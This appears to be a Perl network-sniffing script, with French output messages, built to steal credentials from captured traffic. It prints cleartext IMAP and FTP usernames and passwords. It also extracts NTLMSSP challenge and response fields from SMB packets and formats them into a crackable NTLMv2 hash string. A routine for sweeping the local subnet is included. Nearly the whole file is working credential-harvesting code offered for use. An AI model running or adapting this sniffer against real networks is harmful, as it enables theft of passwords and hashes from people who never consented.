
#!/usr/bin/perl -w
use strict;
use warnings;
use Net::RawIP;
use Net::Pcap::Easy;
use Net::MAC;
use Net::MAC::Vendor;
use Net::DHCP::Packet;
use Getopt::Long;
use Socket;
use threads;
use Encode qw/decode/;
my $SHOW_MAC = 0;
my $listen_mode;
GetOptions ("listen" => \$listen_mode);
my $i =1;
my $server_challenge;

sub StartCap()
{
    my $npe = Net::Pcap::Easy->new(
        timeout_in_ms    => 0, # 0ms means forever
        promiscuous      => 1, # true or false
        bytes_to_capture    => 1024,
        dev => "lo",
	tcp_callback => sub {


        my ($npe, $ether, $ip, $tcp, $header) = @_;

     

        if ($tcp->{dest_port} == 143)
        {
            print "paquet IMAP détecté\n";
            my $login_packet =($ether->{data});
            my $pack_hex = unpack("H*", $login_packet);
            my $pack_type=index($pack_hex, "6c6f");
                
            if ($pack_type != -1)
            {
                my $packet_offset = substr $pack_hex, $pack_type; 
                my $packet_final = pack("H*",$packet_offset);
                my @logins= split (/ /, $packet_final); 
                print $logins[0].":".$logins[1]."\n Password: ".$logins[2];
            }
        }
        if ($tcp->{dest_port} == 445 || $tcp->{src_port} == 139 || $tcp->{src_port} == 445)
        {
            print "SMB Packet $i : ";
            my $packet = ($ether->{data});

            #Convert all packet in Hexadecimal
            my $pack_hex = unpack("H*", $packet );
        
            # Find NTMLSSP in packet SMB and print the packet in hex
            my $pack_find_NTLMSSP=index($pack_hex, "4e544c4d535350");
            my $pack_type1=index($pack_hex, "4e544c4d535350000100");
            my $pack_type2=index($pack_hex, "4e544c4d535350000200");
            my $pack_type3=index($pack_hex, "4e544c4d5353500003000000");

            my $packet_offset = substr $pack_hex, $pack_type3; 
     
            if ($pack_find_NTLMSSP != -1)
            {
                if ($pack_type1 != -1)
                {
                    #print "NTLMSSP - Negotiate Packet position : ";
                    #print $pack_type1 ."\n";
                    #print $pack_hex."\n";

                }
                if ($pack_type2 != -1)
                {
                    #print("\r\n\r\n");
                    #print"CHALLENGE".$pack_hex;
                    #print("\r\n\r\n");
                 
                    print "NTLMSSP - Challenge Packet position : \r\n";
#print $pack_hex."\r\n";
                   # print $pack_type2 ."\n";
                    my $pack_challenge = unpack("H*", $packet);
                    my $pack_type_challenge=index($pack_challenge, "1582");
                    $server_challenge= $pack_type_challenge + 8;
                    $server_challenge = substr $pack_challenge, $server_challenge, "16";
                    print "serveur challenge".$server_challenge."\r\n";


                }
                if ($pack_type3 != -1)
                {
                    #print $pack_hex;
                    #print "NTLMSSP - Authenticate position : ";
                    #print $pack_type3 ."\n"; 
                    my $Ntlmssp_packet  = substr $pack_hex, $pack_type3+24;
                   


                    my $lenght_hex = substr $Ntlmssp_packet,0,4;
                    my $maxlenght_hex = substr $Ntlmssp_packet,4,4;
                    my $offset_hex= substr $Ntlmssp_packet,8,8;

                    my $offset = no_null_bytes($offset_hex);
                    my $maxlenght = no_null_bytes($maxlenght_hex);
                    my $lenght = no_null_bytes($lenght_hex);
                 
                    #print "Lan Manager Response: \n Length: ".hex($lenght)."  \n Maxlength:".hex($maxlenght)."  \n Offset:".hex($offset)."  \n";
                    
                    my $lan_manager_hex = substr $packet_offset,(hex($offset))+(hex($offset)),(hex($maxlenght))+(hex($maxlenght));


                    my $lenght_Response = substr $Ntlmssp_packet,16,4;
                    my $maxlenght_Response = substr $Ntlmssp_packet,20,4;
                    my $offset_Response= substr $Ntlmssp_packet,24,8;


                    $offset = no_null_bytes($offset_Response);

                    $maxlenght = no_null_bytes($maxlenght_Response);
                    $lenght = no_null_bytes($lenght_Response);
                 
                   # print "NTLM Response: \n";
                    
                    my $Ntlm_Response_hex = substr $packet_offset,(hex($offset))+(hex($offset)),(hex($maxlenght))+(hex($maxlenght));

                    
                    print "Ntlm REsponse Hash :". $Ntlm_Response_hex."\n";

                    my $place= index ($Ntlm_Response_hex, "0101000");
                    my $hmac= substr $Ntlm_Response_hex, "0", "32";
                    my $lan= substr $Ntlm_Response_hex,$place;
                    print "hmac".$hmac."\r\n";
                    print "lan".$lan."\r\n";

                   # my $lenght_ResponseV2 = substr $Ntlmssp_packet,32,4;
                   # my $maxlenght_ResponseV2 = substr $Ntlmssp_packet,36,4;
                    #my $offset_ResponseV2= substr $Ntlmssp_packet,40,8;

                    #$offset = no_null_bytes($offset_ResponseV2);
                    #$maxlenght = no_null_bytes($maxlenght_ResponseV2);
                    #$lenght = no_null_bytes($lenght_ResponseV2);

                    my $lenght_domain = substr $Ntlmssp_packet,32,4;
                    my $maxlenght_domain = substr $Ntlmssp_packet,36,4;
                    my $offset_domain= substr $Ntlmssp_packet,40,8;
                   

                    $offset_domain = no_null_bytes($offset_domain);
                    $maxlenght_domain = no_null_bytes($maxlenght_domain);
                    $lenght_domain = no_null_bytes($lenght_domain);
                    $offset_domain = (DecodeGUINT32($offset_domain));
                    print $offset_domain."\r\n";
                    

                    my $lenght_username = substr $Ntlmssp_packet,48,4;
                    my $maxlenght_username = substr $Ntlmssp_packet,52,4;
                    my $offset_username= substr $Ntlmssp_packet,56,8;
                   

                    $offset_username = no_null_bytes($offset_username);
                    $maxlenght_username = no_null_bytes($maxlenght_username);
                    $lenght_username = no_null_bytes($lenght_username);
                    $offset_username = (DecodeGUINT32($offset_username));
               
                   # my $Ntlm_domain = substr $packet_offset,(hex($offset_domain))+(hex($offset_domain)),(hex($maxlenght_domain))+(hex($maxlenght_domain));
                   # print $Ntlm_domain."\r\n";
                    #print $offset_domain."\r\n";
                    #print $maxlenght_domain."\r\n";
  

                    my $username_hex = substr $packet_offset,$offset_username + $offset_username,(hex($maxlenght_username)) + (hex($maxlenght_username));
                    my $domain_hex = substr $packet_offset, $offset_domain + $offset_domain, (hex($maxlenght_domain)) + (hex($maxlenght_domain));
              

                    my $username = pack("H*", $username_hex);
                    my $domain = pack("H*", $domain_hex);

                    print $username."\r\n";
                    print $domain."\r\n";

                    my @item1 = ($domain, $server_challenge, $hmac, $lan);
                    my $mix = join (":", @item1);
                    my @item2 = ($username,$mix);
                    my $mix_final = join("::",@item2);
                    print $mix_final."\r\n";

                    
                }

            }
            else 
            {
                #print "NTLMSSP not found\n";
                #print $pack_hex;
            }
            $i++;
        }
		if ($tcp->{dest_port} == 21)
		{			

  			
  			if ($tcp->{data})
			{
				my $data = $tcp->{data};
				my @table = split(" ",$data);
				if (exists($table[0]) && $table[0] eq 'USER' && exists($table[1]))
				{
					print "Le pseudo est : " .$table[1] ."\n";
				}
				if(exists($table[0])&& $table[0]  eq 'PASS' && exists($table[1]))
				{
					print "Le mot de passe est : " .$table[1] ."\n"; 
				}
			}
			
		}

	}
    );
    print "Network IP : " .$npe->network ."\n";
    print "Netmask : " .$npe->netmask ."\n";
    my $block = GetLocalNetInfo($npe->network, $npe->netmask);

    print "la taille du réseau est:".$block->size()."\n";
    my $networksize = $block->size();
    my $tablesize = $networksize/4;

    print "premiere adresse :".$block->first()."\n";
    print "derniere adresse :".$block->last()."\n";
    if (!$listen_mode)
    {
        MapNetwork($block->first(),$block->last(),$tablesize);
    }
    1 while $npe->loop;
}

sub IPFormat
{
    return join ".", map { hex }($_[0] =~ /([[:xdigit:]]{2})/g)
}

sub MacFormat
{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}


sub ResolveHostName {
    my $hostname = gethostbyaddr(inet_aton($_[0]), AF_INET);
    if ($hostname)
    {
	return $hostname;
    }
    else
    {
	return "Unknown";
    }
}

sub LookupMacVendor {
    my $cmac = Net::MAC->new('mac' => $_[0])->convert(
            'base' => 16,
            'bit_group' => 8,
            'delimiter' => ':'
    ); 
    my $vendor = Net::MAC::Vendor::lookup( $cmac );;
    if (@$vendor[0])
    {
        return @$vendor[0];
    }
    else
    {
        return "Unknown"
    }
}

sub GetLocalNetInfo {
    my $block = new Net::Netmask($_[0],$_[1]);
    return $block;
}

sub MapNetwork {
    my $tablesize = $_[2];
    my $currentip; 
    my ($a,$b,$c,$d) = split(/\./, $_[0]);
    my $count_ip = 0;
    my $y = 0;
    my $z = 0;
    my @table;
    my @tmp = ();
    do
    {
        
        $currentip = "$a.$b.$c.$d";
        $d++;
        #print($currentip."\n");
        push (@tmp, $currentip);
        #$table[$y][$z] = $currentip;
        #print "tableau $y valeur $z Probing : $a.$b.$c.$d\n";

        if ($d == 256)
        {
            $c++;
            $d = 0;
        }
        if ($c == 256)
        {
            $b++;
            $c =0;
        }
        if ($b == 256)
        {
            $a++;
            $b = 0;
        }
        $count_ip++;
        $z++;
        if ($count_ip == $tablesize)
        {
            print("Tableau.\n");

            my $Thread = threads->new(\&SendTable,@tmp);
            $Thread->detach();
            #push @table, [ @tmp ];""
            @tmp = ();
            $y++; 
            $z = 0;
            $count_ip = 0;
        }

    } while ($currentip ne $_[1]);

}

sub SendTable {
    my @tab = @_;
    foreach my $i (@tab)
    {
        print "ENVOIE DU PACKET A L'IP $i\n";
    }

}

sub no_null_bytes
{
    my $i=0;
    my $chaine_final = "";
    my $chaine_bla;
    do
    {
        $chaine_bla=$chaine_bla.$chaine_final;
        $chaine_final=  substr $_[0],$i,2;
        
        $i=$i+2;
    }
    while ($chaine_final ne "00");
    return $chaine_bla;
}

sub DecodeGUINT32{
    my $entity_unicode = decode("UTF-32LE", pack('H8', $_[0]));
    return ord($entity_unicode);
}



StartCap();
